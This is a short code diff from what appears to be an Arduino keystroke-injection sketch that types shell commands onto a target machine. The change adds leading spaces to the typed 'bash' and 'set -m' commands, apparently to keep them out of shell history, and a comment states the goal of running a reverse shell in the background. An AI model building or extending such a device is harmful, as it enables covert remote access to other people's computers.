@@ -37,12 +37,13 @@ void setup()
   typeKey(KEY_RETURN);
 
   delay(200);
-  Keyboard.print(F("bash"));
+  Keyboard.print(F(" bash"));
 
   typeKey(KEY_RETURN);
 
+  // enables job control so we can set reverse shell to run in bg
   delay(200);
-  Keyboard.print(F("set -m"));
+  Keyboard.print(F(" set -m"));
 
   typeKey(KEY_RETURN);
 
